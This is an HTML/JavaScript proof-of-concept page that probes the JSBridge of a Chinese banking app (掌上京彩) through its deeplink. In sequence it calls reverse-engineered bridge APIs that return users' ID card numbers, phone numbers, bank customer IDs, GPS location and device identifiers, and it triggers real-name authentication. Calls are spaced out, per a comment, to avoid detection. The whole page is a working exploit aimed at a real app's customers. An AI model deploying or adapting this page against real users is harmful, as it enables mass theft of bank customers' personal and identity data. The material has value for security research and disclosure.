<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>掌上京彩 JSBridge 探测 PoC</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { background: #0d1117; color: #c9d1d9; font-family: 'Courier New', monospace; font-size: 13px; }
.header { background: #161b22; border-bottom: 1px solid #ff6b6b; padding: 12px 16px; }
.header h1 { color: #ff6b6b; font-size: 16px; }
.header p { color: #8b949e; font-size: 11px; margin-top: 4px; }
.api-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1px; background: #21262d; }
.api-card { background: #0d1117; padding: 10px 12px; }
.api-name { color: #58a6ff; font-size: 11px; font-weight: bold; margin-bottom: 6px; }
.api-status { display: inline-block; padding: 2px 6px; border-radius: 3px; font-size: 10px; margin-bottom: 4px; }
.status-pending { background: #21262d; color: #8b949e; }
.status-success { background: #1a3a2a; color: #3fb950; }
.status-error { background: #3a1a1a; color: #f85149; }
.status-encrypted { background: #3a2a1a; color: #e3b341; }
.api-data { color: #c9d1d9; font-size: 10px; word-break: break-all; max-height: 80px; overflow: auto; background: #161b22; padding: 4px; border-radius: 3px; }
.summary { background: #161b22; border-top: 1px solid #30363d; padding: 12px 16px; }
.summary h2 { color: #e3b341; font-size: 13px; margin-bottom: 8px; }
.highlight { color: #ff6b6b; font-weight: bold; font-size: 14px; }
#progress { color: #8b949e; font-size: 11px; padding: 8px 16px; }
</style>
</head>
<body>

<div class="header">
  <h1>🔍 掌上京彩 三方容器 JSBridge 探测</h1>
  <p>DeepLink: beijingxinyongka://?jumpUrl=https://[本页URL]</p>
</div>

<div id="progress">⏳ 等待 TMFJSBridge 就绪...</div>

<!-- API 结果展示区 -->
<div class="api-grid" id="apiGrid"></div>

<div class="summary" id="summary" style="display:none">
  <h2>📊 汇总结果</h2>
  <div id="summaryContent"></div>
</div>

<script>
// =====================================================
// 受限三方容器可用 JSBridge 完整列表（逆向自 TMFThirdWebViewActivity）
// 标注：每个 API 的参数格式 + 数据内容
// =====================================================
var APIS = [
  // ── 设备信息（全部 RSA 加密）──
  {
    name: 'thirdGetMobileInfo',
    label: '📱 设备信息',
    params: {},
    note: 'MAC/IMEI/UDID/ICCID/IP（RSA加密）'
  },
  
  // ── 用户认证状态（RSA加密）──
  {
    name: 'thirdGetIsLogin',
    label: '🔐 登录状态',
    params: {},
    note: '是否已登录 0=已登录 1=未登录（RSA加密）'
  },
  {
    name: 'thirdGetIsAuthentication',
    label: '✅ 实名认证状态',
    params: {},
    note: '是否已实名认证（RSA加密）'
  },
  
  // ── 用户敏感信息（全部 RSA 加密）──
  {
    name: 'thirdGetUserIdCardNum',
    label: '🪪 身份证号',
    params: {},
    note: 'IdCardNo + IdCardType（RSA加密）'
  },
  {
    name: 'thirdGetUserIdCardMd5Num',
    label: '🪪 身份证 MD5',
    params: {},
    note: '身份证 MD5 哈希（RSA加密）'
  },
  {
    name: 'thirdGetUserPhotoNumber',
    label: '📞 手机号',
    params: {},
    note: '绑定手机号（RSA加密）'
  },
  {
    name: 'thirdGetUserPhotoNumberSuffix',
    label: '📞 手机号后4位',
    params: {},
    note: '手机号末4位（RSA加密）'
  },
  {
    name: 'thirdGetUserPhotoMd5Number',
    label: '📞 手机号 MD5',
    params: {},
    note: '手机号 MD5（RSA加密）'
  },
  {
    name: 'thirdGetUserCif',
    label: '🏦 客户CIF号',
    params: {},
    note: '银行内部客户唯一标识（RSA加密）'
  },
  
  // ── 地理位置（RSA加密）──
  {
    name: 'thirdGetLocation',
    label: '📍 精确GPS定位',
    params: {},
    note: '经纬度（RSA加密）'
  },
  {
    name: 'thirdGetUserLongitudeAndLatitude',
    label: '📍 经纬度',
    params: {},
    note: '用户经纬度（RSA加密）'
  },
  {
    name: 'thirdGetUserProvinceAndCity',
    label: '🏙️ 省市',
    params: {},
    note: '用户所在省市（RSA加密）'
  },
  
  // ── App 版本（可能明文）──
  {
    name: 'thirdGetAppVersion',
    label: '📦 App版本',
    params: {},
    note: 'App 版本号（RSA加密）'
  },
  
  // ── 随机数（可能明文，用于验签）──
  {
    name: 'thirdGetRandomNumber',
    label: '🎲 随机数',
    params: {},
    note: '服务端生成随机数，用于验签'
  },
  
  // ── 业务操作 ──
  {
    name: 'thirdDoAuthentication',
    label: '🔑 发起实名认证',
    params: {},
    note: '触发实名认证流程'
  },
  {
    name: 'thirdGetETCCardListJsapi',
    label: '🚗 ETC卡列表',
    params: {},
    note: '获取用户 ETC 卡信息'
  },
];

var results = {};
var grid = document.getElementById('apiGrid');
var progressEl = document.getElementById('progress');

// 创建每个 API 的显示卡片
APIS.forEach(function(api) {
  var card = document.createElement('div');
  card.className = 'api-card';
  card.id = 'card-' + api.name;
  card.innerHTML = 
    '<div class="api-name">' + api.label + '</div>' +
    '<div class="api-name" style="color:#8b949e;font-weight:normal;margin-bottom:4px">' + api.name + '</div>' +
    '<span class="api-status status-pending" id="status-' + api.name + '">⏳ 等待中</span>' +
    '<div class="api-data" id="data-' + api.name + '">' + api.note + '</div>';
  grid.appendChild(card);
});

// TMFJSBridge 调用封装
function callBridge(apiName, params, callback) {
  var cbId = '__poc_cb_' + apiName + '_' + Date.now();
  window[cbId] = function(result) {
    delete window[cbId];
    callback(null, result);
  };
  try {
    if (window.TMFJSBridge) {
      window.TMFJSBridge.call(apiName, JSON.stringify(params), cbId);
    } else {
      callback('TMFJSBridge 不可用', null);
    }
  } catch(e) {
    callback('调用异常: ' + e.message, null);
  }
  // 超时保护
  setTimeout(function() {
    if (window[cbId]) {
      delete window[cbId];
      callback('超时(5s)', null);
    }
  }, 5000);
}

function updateCard(name, status, data) {
  var statusEl = document.getElementById('status-' + name);
  var dataEl = document.getElementById('data-' + name);
  
  statusEl.className = 'api-status status-' + status;
  statusEl.textContent = {
    'success': '✅ 已响应',
    'error': '❌ 失败',
    'encrypted': '🔒 RSA密文',
    'pending': '⏳ 等待中'
  }[status] || status;
  
  if (data) {
    dataEl.textContent = typeof data === 'string' ? data : JSON.stringify(data);
  }
  results[name] = { status: status, data: data };
}

// 检测结果是否是 RSA 密文（base64 格式的长字符串）
function isEncrypted(str) {
  if (!str) return false;
  try {
    var obj = JSON.parse(str);
    var s = JSON.stringify(obj);
    // 如果里面有超长的 base64 字符串，大概率是 RSA 密文
    return /[A-Za-z0-9+\/]{100,}={0,2}/.test(s);
  } catch(e) {
    return /[A-Za-z0-9+\/]{100,}={0,2}/.test(str);
  }
}

var callIndex = 0;
function runNextApi() {
  if (callIndex >= APIS.length) {
    showSummary();
    return;
  }
  var api = APIS[callIndex++];
  progressEl.textContent = '⏳ 正在探测 [' + callIndex + '/' + APIS.length + '] ' + api.name + '...';
  
  callBridge(api.name, api.params, function(err, result) {
    if (err) {
      updateCard(api.name, 'error', err);
    } else {
      var status = isEncrypted(result) ? 'encrypted' : 'success';
      updateCard(api.name, status, result);
    }
    // 连续调用加间隔防被识别
    setTimeout(runNextApi, 300);
  });
}

function showSummary() {
  progressEl.textContent = '✅ 探测完成！';
  var summary = document.getElementById('summary');
  var content = document.getElementById('summaryContent');
  summary.style.display = 'block';
  
  var successCount = 0, encCount = 0, errCount = 0;
  Object.keys(results).forEach(function(k) {
    var r = results[k];
    if (r.status === 'success') successCount++;
    else if (r.status === 'encrypted') encCount++;
    else errCount++;
  });
  
  content.innerHTML = 
    '<span style="color:#3fb950">✅ 明文响应: ' + successCount + '</span>  ' +
    '<span style="color:#e3b341">🔒 RSA密文: ' + encCount + '</span>  ' +
    '<span style="color:#f85149">❌ 失败: ' + errCount + '</span><br><br>' +
    '<span style="color:#8b949e;font-size:11px">注意：RSA密文需要持有合作商户私钥才能解密<br>' +
    'DeepLink进入方式: beijingxinyongka://?jumpUrl=https://[本页完整URL]</span>';
}

// 主入口：等待 Bridge 就绪
function start() {
  progressEl.textContent = '✅ TMFJSBridge 就绪，开始逐一探测...';
  setTimeout(runNextApi, 500);
}

if (window.TMFJSBridge) {
  start();
} else {
  document.addEventListener('TMFJSBridgeReady', start, { once: true });
  setTimeout(function() {
    if (!window.TMFJSBridge) {
      progressEl.textContent = '❌ TMFJSBridge 未注入！请通过 App DeepLink 打开本页面';
      progressEl.style.color = '#f85149';
    }
  }, 3000);
}
</script>
</body>
</html>
